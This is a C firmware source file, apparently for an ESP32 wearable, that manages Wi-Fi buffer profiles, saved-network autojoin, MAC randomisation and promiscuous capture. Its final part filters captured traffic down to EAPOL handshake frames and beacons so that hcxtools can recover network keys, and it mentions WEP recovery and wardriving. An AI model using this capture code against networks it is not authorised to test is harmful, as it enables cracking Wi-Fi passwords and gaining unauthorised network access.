    /* LEAN PROFILE (BLE⇄WiFi coexistence): the WiFi driver's internal-DMA footprint is fixed at
     * esp_wifi_init() by the BUFFER COUNTS below — it does NOT shrink when the link goes idle, so
     * throttling throughput frees nothing. Re-initialising with a smaller buffer set is what actually
     * returns RAM (~58 KB full vs ~35-40 KB lean), and it is the only way to keep the station
     * ASSOCIATED while handing the BLE controller the ~30 KB CONTIGUOUS block it needs. These fields
     * are runtime members of wifi_init_config_t, so the same binary can do both. Lean costs
     * throughput (no AMPDU RX, tiny queues) — fine for the phone link, weather + time sync; monitor /
     * capture / wardrive should run on the full profile. */
    s_lean_saved.srx = nocsif_settings_get_i32("wl_srx", 2);   /* bring_up runs on an internal-stack task */
    s_lean_saved.stx = nocsif_settings_get_i32("wl_stx", 2);
    s_lean_saved.rxq = nocsif_settings_get_i32("wl_rxq", 4);
    s_lean_saved.agg = nocsif_settings_get_i32("wl_agg", 0);
    s_lean_saved.ba  = 0;
    /* Defaults measured 2026-10-14 in the mode (paced UDP from the LAN, -69 dBm): 4/16/6 -> 8/32/16 raised the
     * uplink receive ceiling ~4 -> ~7 Mbit/s; 12/48/24 added nothing. 8 static TX for the hotspot direction.
     * Cost ~12 KB of the ~39 KB the mode frees (free pool ~27 KB after). */
    s_router_saved.srx   = nocsif_settings_get_i32("tr_srx", 8);
    s_router_saved.stx   = nocsif_settings_get_i32("tr_stx", 8);
    s_router_saved.cache = nocsif_settings_get_i32("tr_cache", 12);
    s_router_saved.rxq   = nocsif_settings_get_i32("tr_rxq", 32);
    s_router_saved.ba    = nocsif_settings_get_i32("tr_ba", 16);
    s_router_saved.atx   = nocsif_settings_get_i32("tr_atx", 1);
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    if (s_gw_profile) {
        /* TRAVEL ROUTER THROUGHPUT PROFILE (overrides lean at boot when share is persisted). The lean set
         * disables 802.11n aggregation entirely (rx_ba_win=0, ampdu_tx=0) — the single biggest reason the
         * shared APSTA path is slow, since every forwarded byte crosses the one radio twice with no
         * aggregation. Turn aggregation back ON, with enough static/cache TX buffers to actually feed a
         * block-ack session (2 static TX was the stall trap in LESSONS.md). Buffer COUNT raises int-DMA
         * total-free use but does NOT shrink the largest contiguous hole (RAM-BUDGET.md measured: lean &
         * full both leave largest=15,872), and BLE's ~31.7 KB block is claimed before this init, so this
         * does not touch the coexistence gate. Dynamic RX + LWIP route to PSRAM (SPIRAM_TRY_ALLOCATE_WIFI_
         * LWIP), so the internal-DMA cost is the static RX/TX (1.6 KB ea) + cache TX; trimmed vs the full
         * IDF default (static_tx 6, cache_tx 16) to keep steady-state headroom for the LoRa-alert/mic
         * reserves. rx_ba_win 6 <= 2*static_rx (8) and <= dynamic_rx (16). */
        cfg.static_rx_buf_num  = 4;
        cfg.dynamic_rx_buf_num = 16;   /* PSRAM */
        cfg.static_tx_buf_num  = 4;
        cfg.cache_tx_buf_num   = 12;
        cfg.rx_mgmt_buf_num    = 4;
        cfg.ampdu_rx_enable    = 1;
        cfg.rx_ba_win          = 6;
        cfg.ampdu_tx_enable    = 1;
        /* Travel Router mode tuning (NVS tr_srx / tr_stx / tr_cache / tr_rxq / tr_ba / tr_atx, bridge `tr a=tune`,
         * next boot): the mode frees Bluetooth's ~32 KB and the USB 8 KB reserve, so the set can grow past the
         * gateway defaults above. A set the driver rejects falls back to them. */
        s_router_tune = s_router_saved;
        if (s_router_tune.srx < 2)  s_router_tune.srx = 2;
        if (s_router_tune.srx > 12) s_router_tune.srx = 12;
        if (s_router_tune.stx < 2)  s_router_tune.stx = 2;
        if (s_router_tune.stx > 16) s_router_tune.stx = 16;
        if (s_router_tune.cache < 4)  s_router_tune.cache = 4;
        if (s_router_tune.cache > 32) s_router_tune.cache = 32;
        if (s_router_tune.rxq < s_router_tune.srx) s_router_tune.rxq = s_router_tune.srx;
        if (s_router_tune.rxq > 64) s_router_tune.rxq = 64;
        if (s_router_tune.ba < 0) s_router_tune.ba = 0;
        if (s_router_tune.ba > s_router_tune.rxq)     s_router_tune.ba = s_router_tune.rxq;
        if (s_router_tune.ba > 2 * s_router_tune.srx) s_router_tune.ba = 2 * s_router_tune.srx;
        if (s_router_tune.ba > 32) s_router_tune.ba = 32;
        s_router_tune.atx = s_router_tune.atx ? 1 : 0;
        cfg.static_rx_buf_num  = s_router_tune.srx;
        cfg.dynamic_rx_buf_num = s_router_tune.rxq;
        cfg.static_tx_buf_num  = s_router_tune.stx;
        cfg.cache_tx_buf_num   = s_router_tune.cache;
        cfg.ampdu_rx_enable    = s_router_tune.ba > 0;
        cfg.rx_ba_win          = s_router_tune.ba;
        cfg.ampdu_tx_enable    = s_router_tune.atx;
    } else if (s_lean) {
        cfg.static_rx_buf_num  = 2;    /* MAC RX DMA buffers, 1.6 KB each (must be internal)      */
        cfg.dynamic_rx_buf_num = 4;
        cfg.static_tx_buf_num  = 2;    /* 1.6 KB each */
        cfg.cache_tx_buf_num   = 4;
        cfg.rx_mgmt_buf_num    = 2;
        cfg.ampdu_rx_enable    = 0;    /* drops the block-ack reorder buffers entirely            */
        cfg.rx_ba_win          = 0;    /* must be 0 when AMPDU RX is off                          */
        /* AMPDU TX off too: with 2 static + 4 cache TX buffers an aggregated block-ack session has
         * nothing to aggregate from, and a BA session that loses its BlockAck stalls that station's
         * whole TX queue while the uplink keeps working — the companion mirror's "phone stops
         * updating, watch still obeys" signature (2026-09-27 recordings). Plain frames + ACKs only. */
        cfg.ampdu_tx_enable    = 0;
        /* Owner-tunable depths (NVS wl_srx / wl_stx / wl_rxq / wl_agg, bridge `wifi a=tune`, next boot).
         * Forwarding test 2026-10-11 (phone streaming on the hotspot): lean peaked ~2.9 Mbit/s. Dynamic RX
         * buffers and the AMPDU reorder memory are PSRAM-first here (SPIRAM_TRY_ALLOCATE_WIFI_LWIP — IDF's
         * own Kconfig recommends a 16-frame BA window in that case), so a deeper RX queue and RX
         * aggregation cost little internal RAM; static RX/TX buffers are 1.6 KB of internal DMA each. */
        s_lean_tune = s_lean_saved;
        if (s_lean_tune.srx < 2) s_lean_tune.srx = 2;
        if (s_lean_tune.srx > 6) s_lean_tune.srx = 6;
        if (s_lean_tune.stx < 2) s_lean_tune.stx = 2;
        if (s_lean_tune.stx > 6) s_lean_tune.stx = 6;
        if (s_lean_tune.rxq < s_lean_tune.srx) s_lean_tune.rxq = s_lean_tune.srx;
        if (s_lean_tune.rxq > 64) s_lean_tune.rxq = 64;
        s_lean_tune.agg = s_lean_tune.agg ? 1 : 0;
        int ba = 0;
        if (s_lean_tune.agg) {
            ba = 16;
            if (ba > s_lean_tune.rxq)     ba = s_lean_tune.rxq;
            if (ba > 2 * s_lean_tune.srx) ba = 2 * s_lean_tune.srx;
        }
        s_lean_tune.ba = ba;
        cfg.static_rx_buf_num  = s_lean_tune.srx;
        cfg.dynamic_rx_buf_num = s_lean_tune.rxq;
        cfg.static_tx_buf_num  = s_lean_tune.stx;
        cfg.cache_tx_buf_num   = s_lean_tune.stx > 2 ? 2 * s_lean_tune.stx : 4;
        cfg.ampdu_rx_enable    = s_lean_tune.agg;
        cfg.rx_ba_win          = ba;
    }
    e = esp_wifi_init(&cfg);
    if (e != ESP_OK && s_lean && !s_gw_profile) {
        /* A tuned lean set the driver rejects must never cost the owner Wi-Fi: fall back to the stock set. */
        ESP_LOGE(TAG, "esp_wifi_init (lean srx=%d stx=%d rxq=%d agg=%d ba=%d): %s — retrying the stock lean set",
                 s_lean_tune.srx, s_lean_tune.stx, s_lean_tune.rxq, s_lean_tune.agg, s_lean_tune.ba, esp_err_to_name(e));
        cfg.static_rx_buf_num = 2; cfg.dynamic_rx_buf_num = 4; cfg.static_tx_buf_num = 2; cfg.cache_tx_buf_num = 4;
        cfg.ampdu_rx_enable = 0; cfg.rx_ba_win = 0;
        s_lean_tune.srx = 2; s_lean_tune.stx = 2; s_lean_tune.rxq = 4; s_lean_tune.agg = 0; s_lean_tune.ba = 0;
        e = esp_wifi_init(&cfg);
    }
    if (e != ESP_OK && s_gw_profile) {
        /* Same for a tuned router set: fall back to the gateway defaults. */
        ESP_LOGE(TAG, "esp_wifi_init (router srx=%d stx=%d cache=%d rxq=%d ba=%d atx=%d): %s — retrying the default set",
                 s_router_tune.srx, s_router_tune.stx, s_router_tune.cache, s_router_tune.rxq, s_router_tune.ba,
                 s_router_tune.atx, esp_err_to_name(e));
        s_router_tune = (nocsif_wifi_router_tune_t){ .srx = 4, .stx = 4, .cache = 12, .rxq = 16, .ba = 6, .atx = 1 };
        cfg.static_rx_buf_num = 4; cfg.dynamic_rx_buf_num = 16; cfg.static_tx_buf_num = 4; cfg.cache_tx_buf_num = 12;
        cfg.ampdu_rx_enable = 1; cfg.rx_ba_win = 6; cfg.ampdu_tx_enable = 1;
        e = esp_wifi_init(&cfg);
    }
    if (e != ESP_OK) { ESP_LOGE(TAG, "esp_wifi_init: %s", esp_err_to_name(e)); goto fail; }
    ESP_LOGI(TAG, "esp_wifi_init (%s profile; static rx %d tx %d, cache tx %d, rx queue %d, rx aggregation %s ba %d, "
                  "tx aggregation %s); "
                  "int-dma free=%u largest=%u",
             s_gw_profile ? "ROUTER" : s_lean ? "LEAN" : "full", (int)cfg.static_rx_buf_num,
             (int)cfg.static_tx_buf_num, (int)cfg.cache_tx_buf_num, (int)cfg.dynamic_rx_buf_num,
             cfg.ampdu_rx_enable ? "on" : "off", (int)cfg.rx_ba_win, cfg.ampdu_tx_enable ? "on" : "off",
             (unsigned)nocsif_int_dma_free(), (unsigned)nocsif_int_dma_largest());

    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_event_handler_instance_register(
        WIFI_EVENT, ESP_EVENT_ANY_ID, &on_wifi_evt, NULL, &s_h_wifi));
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_event_handler_instance_register(
        IP_EVENT, IP_EVENT_STA_GOT_IP, &on_ip_evt, NULL, &s_h_ip));

    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_storage(WIFI_STORAGE_RAM));  /* we own the credentials */
    publish_current_mac();      /* the station MAC is readable now, so the net menu can show it */
    apply_hostname();           /* how the watch appears on the network, before the first DHCP request */

    s_driver_up = true;
    s_available = true;
    ESP_LOGI(TAG, "esp_wifi initialised (STA); int-dma free=%u",
             (unsigned)nocsif_int_dma_free());
    return true;

fail:
    publish_status("err");
    publish_detail("WiFi init failed.");
    return false;
}

static bool ensure_started(void)
{
    if (s_sta_started) {
        return true;
    }
    esp_err_t e = esp_wifi_start();     /* async: STA_START sets s_sta_started */
    if (e != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_start: %s", esp_err_to_name(e));
        publish_status("err");
        publish_detail("Radio failed to start.");
        return false;
    }
    return true;
}

/* Push s_ssid/s_pass into the driver as the STA config (permissive auth threshold so any
 * AP of that SSID is eligible; the passphrase decides success).
 *
 * FAST vs ALL-channel scan: esp_wifi_connect() first scans for the SSID. WIFI_ALL_CHANNEL_SCAN
 * sweeps ALL 13 channels to completion and then picks the strongest match — correct for roaming,
 * but SLOW (each channel dwells, and under BLE coexistence the radio is time-sliced, so a cold
 * join ran ~20 s). WIFI_FAST_SCAN stops at the FIRST AP that matches the SSID + threshold, so a
 * home AP on ch 1/6/11 associates in a second or two. We pick the strongest SAVED network to join
 * in the worker BEFORE this (do_scan_done autojoin pick), so the driver no longer needs to do the
 * signal sort itself — fast scan is the right trade for a single-AP network. */
static void apply_config(void)
{
    wifi_config_t wc = { 0 };
    snprintf((char *)wc.sta.ssid, sizeof wc.sta.ssid, "%s", s_ssid);
    snprintf((char *)wc.sta.password, sizeof wc.sta.password, "%s", s_pass);
    wc.sta.threshold.authmode = WIFI_AUTH_OPEN;   /* accept any; passphrase gates the join */
    wc.sta.scan_method = WIFI_FAST_SCAN;          /* associate to the first SSID match, don't sweep all 13 */
    wc.sta.sort_method = WIFI_CONNECT_AP_BY_SIGNAL;  /* only consulted if fast scan sees >1 on a channel */
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_config(WIFI_IF_STA, &wc));
}

/* ---- worker command handlers ---- */
static void do_enable(void)
{
    /* BLE never yields WiFi the radio anymore — the controller is reserved
     * at boot and stays resident for the whole session — so there's no more
     * "reclaim the radio from the phone link" dance; this just brings the
     * driver up. */
    if (!bring_up()) {
        return;
    }
    if (s_ap_active) { ap_teardown(); }     /* with only one radio, using STA mode ends the AP */
    s_enabled = true;
    s_user_dropped = false;
    s_autojoin_pending = false;
    s_autojoin_direct = false;              /* a new look supersedes any direct try still in flight */

    /* Auto-join (improved): instead of blind-connecting to the LAST network (s_ssid) — which fails and
     * burns retries whenever that network isn't the one you're near — SCAN first, then join the STRONGEST
     * SAVED network actually in range (do_scan_done does the pick once this scan completes). A quick look
     * at what's around, then one targeted join. The pick has an RSSI floor and a direct try of the
     * last-linked network when nothing clears it (see do_scan_done); if no saved network is reachable the
     * radio stays on + idle (the Governor re-looks every GOV_RELOOK_S; an explicit tap still joins anything). */
    if (s_autojoin && s_sv_cnt > 0) {
        s_want_connect = false;                 /* the scan-done pick arms the real connect */
        s_retry = 0;
        s_auth_fail = false;
        s_autojoin_pending = true;
        s_join_state = NOCSIF_WIFI_JOIN_JOINING; /* show "looking…" through the scan + pick */
        if (ensure_started()) {
            if (s_sta_started) start_scan_now();   /* already up -> scan now */
            else               s_pending_scan = true;  /* STA_START kicks it */
        }
        refresh_strings();
        return;
    }

    /* Auto-join off (or nothing saved yet): power the radio idle — no connect until an explicit tap. */
    s_want_connect = false;
    ensure_started();
    refresh_strings();
}

static void do_disable(void)
{
    if (s_ap_active) { ap_teardown(); }   /* powering off also ends the software AP */
    monitor_teardown();     /* stops capture if it was running; powering off doesn't restore the STA link */
    s_want_connect = false;
    s_enabled = false;
    s_connected = false;
    s_scanning = false;
    s_autojoin_direct = false;          /* radio off: the next wake's pick starts with the direct route again */
    s_autojoin_direct_failed = false;
    s_join_state = NOCSIF_WIFI_JOIN_IDLE;
    clear_netinfo();
    if (s_sta_started) {
        esp_wifi_disconnect();
        esp_wifi_stop();    /* STA_STOP clears s_sta_started */
    }
    refresh_strings();
}

/* Arms the lean/full buffer profile. Strictly a boot-time input
 * (RAM-BUDGET.md remake #5/#9): the driver's internal-DMA footprint is fixed
 * at the single esp_wifi_init call, and a runtime swap would tear the driver
 * down and reinitialize it — exactly the fragmentation churn the resident-
 * block architecture exists to avoid, and measurements show it can't
 * re-widen the contiguous hole anyway. So this just sets a flag the next
 * bring-up reads; if the driver is already up, the change is simply ignored
 * (a reboot would be needed to apply it, though lean is always the correct
 * choice while Bluetooth is on). The old yield-based runtime re-init
 * approach is gone. */
static void do_lean_set(bool lean)
{
    if (s_lean == lean) {
        return;
    }
    if (s_driver_up) {
        ESP_LOGW(TAG, "WiFi %s profile requested at runtime — ignored (fixed at init; already %s)",
                 lean ? "LEAN" : "full", s_lean ? "LEAN" : "full");
        return;
    }
    s_lean = lean;
    ESP_LOGI(TAG, "WiFi %s profile armed (applies at the next bring-up)", lean ? "LEAN" : "full");
}

static void do_scan(void)
{
    if (!bring_up()) {
        return;
    }
    if (s_ap_active) { ap_teardown(); }   /* with only one radio, a scan ends the AP */
    s_enabled = true;           /* a scan powers the radio on */
    if (!ensure_started()) {
        return;
    }
    if (s_sta_started) {
        start_scan_now();
    } else {
        s_pending_scan = true;  /* STA_START will kick the scan off */
        refresh_strings();
    }
}

static void do_connect_saved(const char *ssid);   /* fwd: autojoin pick connects via the saved creds */

static void do_scan_done(void)
{
    uint16_t num = 0;
    esp_wifi_scan_get_ap_num(&num);
    uint16_t want = (num > WIFI_MAX_AP) ? WIFI_MAX_AP : num;
    esp_err_t e = esp_wifi_scan_get_ap_records(&want, s_recs);   /* frees the internal record list */
    if (e != ESP_OK) {
        ESP_LOGW(TAG, "scan_get_ap_records: %s", esp_err_to_name(e));
        want = 0;
    }

    /* Sorts by RSSI descending, then dedups by SSID keeping the strongest entry, writing into the back buffer. */
    for (int i = 1; i < want; i++) {              /* an insertion sort on s_recs */
        wifi_ap_record_t key = s_recs[i];
        int j = i - 1;
        while (j >= 0 && s_recs[j].rssi < key.rssi) { s_recs[j + 1] = s_recs[j]; j--; }
        s_recs[j + 1] = key;
    }

    int w = s_ap_i ^ 1;
    int n = 0;
    for (int i = 0; i < want && n < WIFI_MAX_AP; i++) {
        const char *ssid = (const char *)s_recs[i].ssid;
        bool dup = false;
        for (int k = 0; k < n; k++) {
            if (ssid[0] && strncmp(s_ap[w][k].ssid, ssid, sizeof s_ap[w][k].ssid) == 0) { dup = true; break; }
        }
        if (dup) {
            continue;
        }
        snprintf(s_ap[w][n].ssid, sizeof s_ap[w][n].ssid, "%s", ssid);
        s_ap[w][n].rssi     = s_recs[i].rssi;
        s_ap[w][n].authmode = (uint8_t)s_recs[i].authmode;
        s_ap[w][n].channel  = s_recs[i].primary;
        n++;
    }
    s_ap_cnt[w] = n;
    s_ap_i = w;                 /* publishes the snapshot atomically */
    s_scan_gen++;
    s_scanning = false;
    ESP_LOGI(TAG, "scan done: %u found, %d shown", (unsigned)num, n);

    /* Auto-join pick: this scan was kicked by do_enable to find the strongest SAVED network in range.
     * The published snapshot is already sorted by RSSI (desc) and deduped by SSID, so the FIRST saved
     * SSID we hit walking it IS the strongest one present.
     *
     * Three guards (2026-10-11, on-device, two sessions):
     *   1. the automatic pick ignores saved networks below WIFI_AUTOJOIN_RSSI_FLOOR (a tap still joins any):
     *      a broad active scan can MISS the home AP outright — two consecutive re-look scans listed 15 APs
     *      without it (ch 2, -70 dBm when linked) — and the pick then fell to a saved -88 dBm neighbour
     *      whose first join died with reason=2 and whose second took >80 s to get an address;
     *   2. the LAST-LINKED network (K_SSID, written only at got-IP so a failed explicit join never moves it)
     *      is PREFERRED whenever the scan shows it above the floor, even if another saved network is
     *      stronger: the same neighbour later scanned at -43 dBm against home's -70 and won the
     *      strongest-saved pick, then failed two joins on handshake timeouts (reason 2 / 204) and linked
     *      only on the third re-look (~65 s unlinked) while home links in ~7 s;
     *   3. when nothing saved clears the floor, the last-linked network is tried DIRECTLY: esp_wifi_connect
     *      runs its own FAST_SCAN for that one SSID and finds it when it is really there.
     * Either last-linked route marks the join (s_autojoin_direct); if it gives up (do_link_lost: NO_AP_FOUND
     * after the fast retries, or an auth-class drop) the NEXT re-look skips the preference once — strongest
     * saved above the floor, else the strongest weak pick — and the one after that prefers it again,
     * alternating until something links (a link clears both flags). With no saved network reachable the
     * radio stays on + idle. Every look logs the saved networks it saw, then one decision line. */
    if (s_autojoin_pending) {
        s_autojoin_pending = false;
        char last[WIFI_SSID_MAX];           /* last-LINKED network (persisted at got-IP), not the last TARGET */
        nocsif_settings_get_str(K_SSID, last, sizeof last, "");
        const char *pick = NULL;            /* strongest saved network in the snapshot, any level */
        int         pick_rssi = -127;
        bool        last_seen = false;      /* the last-linked network is in the snapshot ... */
        int         last_rssi = -127;       /* ... at this level */
        static char seen[WIFI_MAX_SAVED * (WIFI_SSID_MAX + 10)];   /* static: the worker stack is 4 KB and
                                                                       this frame stays live through the join */
        size_t      seen_len = 0;
        seen[0] = '\0';
        for (int i = 0; i < n; i++) {
            if (!s_ap[w][i].ssid[0] || !nocsif_wifi_is_saved(s_ap[w][i].ssid)) {
                continue;
            }
            if (pick == NULL) { pick = s_ap[w][i].ssid; pick_rssi = s_ap[w][i].rssi; }
            if (last[0] && strcmp(s_ap[w][i].ssid, last) == 0) { last_seen = true; last_rssi = s_ap[w][i].rssi; }
            if (seen_len < sizeof seen) {
                int k = snprintf(seen + seen_len, sizeof seen - seen_len, "%s\"%s\" %d",
                                 seen_len ? ", " : "", s_ap[w][i].ssid, (int)s_ap[w][i].rssi);
                seen_len += (k > 0 && (size_t)k < sizeof seen - seen_len) ? (size_t)k : 0;
            }
        }
        ESP_LOGI(TAG, "autojoin: saved in range (%d seen): %s", n, seen[0] ? seen : "none");
        if (!s_autojoin_direct_failed && last_seen && last_rssi >= WIFI_AUTOJOIN_RSSI_FLOOR) {
            ESP_LOGI(TAG, "autojoin: pick last-linked \"%s\" (%d dBm)", last, last_rssi);
            do_connect_saved(last);
            s_autojoin_direct = true;   /* set AFTER do_connect (which clears it): a last-linked join */
            return;
        }
        if (pick && pick_rssi >= WIFI_AUTOJOIN_RSSI_FLOOR) {
            const bool skipped = s_autojoin_direct_failed && last_seen;   /* the preference sat out this look */
            s_autojoin_direct_failed = false;
            ESP_LOGI(TAG, "autojoin: pick \"%s\" (%d dBm)%s", pick, pick_rssi,
                     skipped ? " (last-linked skipped once)" : "");
            do_connect_saved(pick);   /* looks up the stored passphrase + connects */
            return;                   /* do_connect_saved rebuilt the strings */
        }
        if (!s_autojoin_direct_failed && last[0] && nocsif_wifi_is_saved(last)) {
            ESP_LOGI(TAG, "autojoin: nothing above floor (%d dBm, %d seen), trying last-connected \"%s\"",
                     WIFI_AUTOJOIN_RSSI_FLOOR, n, last);
            do_connect_saved(last);
            s_autojoin_direct = true;   /* set AFTER do_connect (which clears it): this join is the direct try */
            return;
        }
        s_autojoin_direct_failed = false;   /* alternate: the re-look after this one tries the direct route again */
        if (pick) {
            ESP_LOGI(TAG, "autojoin: last-connected out of reach, falling back to weak \"%s\" (%d dBm)",
                     pick, pick_rssi);
            do_connect_saved(pick);
            return;
        }
        s_join_state = NOCSIF_WIFI_JOIN_IDLE;
        ESP_LOGI(TAG, "autojoin: no saved network in range (%d seen) — radio idle", n);
    }
    refresh_strings();
}

static void do_connect(const char *ssid, const char *pass)
{
    if (ssid == NULL || ssid[0] == '\0') {
        return;
    }
    monitor_teardown();   /* single radio: a join ends promiscuous capture / WEP recovery */
    snprintf(s_ssid, sizeof s_ssid, "%s", ssid);
    snprintf(s_pass, sizeof s_pass, "%s", pass ? pass : "");
    s_retry = 0;
    s_auth_fail = false;
    s_user_dropped = false;
    s_autojoin_direct = false;   /* an explicit tap (or a strong pick) is never the direct try */
    s_want_connect = true;
    s_join_state = NOCSIF_WIFI_JOIN_JOINING;

    if (!bring_up()) {
        return;
    }
    if (s_ap_active) { ap_teardown(); }   /* with only one radio, a join ends the AP */
    s_enabled = true;
    apply_config();
    if (!ensure_started()) {
        return;
    }
    if (s_sta_started) {
        if (s_connected) {
            esp_wifi_disconnect();   /* switching networks: drop the old link; the disconnect
                                        handler reconnects using the new config, since want_connect stays true */
        } else {
            try_connect();           /* already idle and started: connect to the new network right now */
        }
    }                                /* not started yet: STA_START will trigger the connect */
    refresh_strings();
}

static void do_disconnect(void)
{
    s_want_connect = false;
    s_user_dropped = true;      /* a deliberate drop: the Governor's re-look must not undo it (its park/retry still does) */
    s_connected = false;
    s_join_state = NOCSIF_WIFI_JOIN_IDLE;
    clear_netinfo();
    if (s_sta_started) {
        esp_wifi_disconnect();
    }
    refresh_strings();
}

static void do_forget(void)
{
    s_ssid[0] = '\0';
    s_pass[0] = '\0';
    nocsif_settings_set_str(K_SSID, "");
    nocsif_settings_set_str(K_PASS, "");
    ESP_LOGI(TAG, "saved network forgotten");
    do_disconnect();
}

static void do_connect_saved(const char *ssid)
{
    for (int i = 0; i < s_sv_cnt; i++) {
        if (strcmp(s_sv_ssid[i], ssid) == 0) {
            do_connect(s_sv_ssid[i], s_sv_pass[i]);   /* the stored passphrase, no prompt needed */
            return;
        }
    }
    ESP_LOGW(TAG, "connect_saved: \"%s\" not saved", ssid ? ssid : "");
}

static void do_forget_ssid(const char *ssid)
{
    if (ssid == NULL || ssid[0] == '\0') {
        return;
    }
    remove_saved(ssid);
    if (strcmp(s_ssid, ssid) == 0) {   /* forgetting the active/primary network: clear it and drop the link */
        s_ssid[0] = '\0';
        s_pass[0] = '\0';
        nocsif_settings_set_str(K_SSID, "");
        nocsif_settings_set_str(K_PASS, "");
        do_disconnect();
    }
    ESP_LOGI(TAG, "forgot \"%s\" (saved=%d)", ssid, s_sv_cnt);
}

/* Rejoins the already-saved network, using credentials already cached
 * in s_ssid/s_pass. Forces a connect regardless of s_autojoin, since this
 * path only ever runs on an explicit user tap. */
static void do_reconnect(void)
{
    if (s_ssid[0] == '\0') {
        return;                 /* nothing saved to reconnect to */
    }
    if (!bring_up()) {
        return;
    }
    if (s_ap_active) { ap_teardown(); }   /* with only one radio, a reconnect ends the AP */
    s_enabled = true;
    s_user_dropped = false;   /* an explicit re-join (the tap, or the Governor's phone-park release) ends a deliberate drop */
    s_want_connect = true;
    s_retry = 0;
    s_auth_fail = false;
    s_join_state = NOCSIF_WIFI_JOIN_JOINING;
    apply_config();
    if (!ensure_started()) {
        return;
    }
    if (s_sta_started && !s_connected) {
        try_connect();          /* already started and idle: connect now; otherwise STA_START will */
    }
    refresh_strings();
}

/* Applies a station MAC. esp_wifi_set_mac requires the interface to be
 * stopped first, so a live link is dropped, the MAC is set, and the radio is
 * restarted (STA_START rejoins if s_want_connect is still set). */
static void apply_mac(const uint8_t mac[6])
{
    if (!bring_up()) {
        return;
    }
    bool restart = s_sta_started;
    if (restart) {
        esp_wifi_stop();        /* a synchronous stop; the STA_STOP event follows */
        s_sta_started = false;  /* reflect it now so ensure_started() actually restarts */
        s_connected = false;
        clear_netinfo();
    }
    esp_err_t e = esp_wifi_set_mac(WIFI_IF_STA, mac);
    if (e != ESP_OK) {
        ESP_LOGW(TAG, "esp_wifi_set_mac: %s", esp_err_to_name(e));
    } else {
        ESP_LOGI(TAG, "STA MAC set to %02x:%02x:%02x:%02x:%02x:%02x",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    }
    publish_current_mac();      /* reflect whatever value actually took effect */
    if (restart) {
        ensure_started();       /* STA_START fires, and try_connect() runs if a link is still wanted */
    }
    refresh_strings();
}

static void do_randmac(void)
{
    uint8_t mac[6];
    esp_fill_random(mac, sizeof mac);
    mac[0] = (mac[0] & 0xFE) | 0x02;   /* unicast (bit0=0) and locally administered (bit1=1) */
    apply_mac(mac);
}

static void do_restmac(void)
{
    if (s_mac_factory_ok) {
        apply_mac(s_mac_factory);
    }
}

/* Applies a renamed hostname. If currently associated, the link is
 * bounced so the new name goes out in a fresh DHCP request; if idle, it's
 * just set for the next connect. */
static void do_apply_host(void)
{
    if (!s_driver_up) {
        return;                 /* bring_up() will apply it on first use */
    }
    apply_hostname();
    if (s_connected && s_want_connect) {
        esp_wifi_disconnect();  /* the reconnect handler re-associates, triggering a new DHCP request carrying the new name */
    }
}

/* ---- monitor / promiscuous capture (M5-P2) ---- */

/* The promiscuous rx callback runs in the WiFi task's own context on
 * every single captured frame, so it must stay strictly O(1),
 * allocation-free, and log-free: it only bumps volatile tallies, which are
 * lock-free for UI readers since there's a single writer. No frame is
 * stored and no SSID is parsed here — that's P3's job. */
/* If `d` (a data frame, `len` bytes on the air) carries an EAPOL
 * payload — LLC/SNAP with ethertype 0x888e — returns the byte offset of the
 * EAPOL header, just past the SNAP; otherwise returns 0. Accounts for the
 * optional QoS control field and a 4-address (WDS) header, and rejects
 * protected frames, since an installed key ciphers the SNAP and it can't be
 * read. Cheap and O(1): non-data and protected frames bail out within the
 * first couple of bytes, so the bulk of encrypted traffic short-circuits
 * immediately. */
static int eapol_offset(const uint8_t *d, int len)
{
    if (len < 4)                     return 0;
    if (((d[0] >> 2) & 0x3) != 2)    return 0;        /* data frames only */
    if (d[1] & 0x40)                 return 0;        /* protected: the SNAP is ciphered and unreadable */
    uint8_t fsub   = (d[0] >> 4) & 0xF;
    bool    tods   = (d[1] & 0x01) != 0;
    bool    fromds = (d[1] & 0x02) != 0;
    int hdr = 24;
    if (tods && fromds) hdr += 6;                     /* a 4-address (WDS) header */
    if (fsub & 0x08)    hdr += 2;                     /* QoS control field */
    if (hdr + 8 > len)  return 0;
    if (d[hdr] != 0xAA || d[hdr + 1] != 0xAA || d[hdr + 2] != 0x03)      return 0;  /* LLC */
    if (d[hdr + 3] || d[hdr + 4] || d[hdr + 5])                         return 0;  /* OUI 0 */
    if (d[hdr + 6] != 0x88 || d[hdr + 7] != 0x8E)                       return 0;  /* ethertype 0x888e */
    return hdr + 8;                                    /* the EAPOL header's offset */
}

/* The predicate for an EAPOL-filtered PCAP session (M5-P4.1): keeps
 * only EAPOL data frames plus the beacon or probe-response that names the
 * network, since hcxtools needs the ESSID to recover a key. In a FULL
 * session every frame is kept (matching P3.3). Runs in the rx hot path, so
 * it must stay O(1). */
static bool pcap_frame_wanted(const uint8_t *d, int len, wifi_promiscuous_pkt_type_t type)
{
    if (s_pcap_filter == PCAP_FILTER_FULL) return true;
    if (type == WIFI_PKT_DATA)             return eapol_offset(d, len) != 0;
    if (type == WIFI_PKT_MGMT && len >= 1) {
        uint8_t fsub = (d[0] >> 4) & 0xF;
        return fsub == 8 || fsub == 5;                /* beacon (subtype 8) or probe-response (subtype 5) */
    }
    return false;
}

static void on_promiscuous(void *buf, wifi_promiscuous_pkt_type_t type)
{
    s_mon_total++;
    nocsif_wifi_pkt_kind_t k;
    switch (type) {
        case WIFI_PKT_MGMT: k = NOCSIF_WIFI_PKT_MGMT; break;
        case WIFI_PKT_CTRL: k = NOCSIF_WIFI_PKT_CTRL; break;
        case WIFI_PKT_DATA: k = NOCSIF_WIFI_PKT_DATA; break;
        default:            k = NOCSIF_WIFI_PKT_MISC; break;
    }
    s_mon_by_type[k]++;

    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
    if (p) {
        int ch = p->rx_ctrl.channel;                  /* attribute it to the frame's own channel */
        if (ch >= 1 && ch <= 13) {
            s_mon_ch[ch]++;
        }
        int8_t r = (int8_t)p->rx_ctrl.rssi;
        s_mon_rssi_last = r;
        if (r > s_mon_rssi_peak) {
            s_mon_rssi_peak = r;
        }
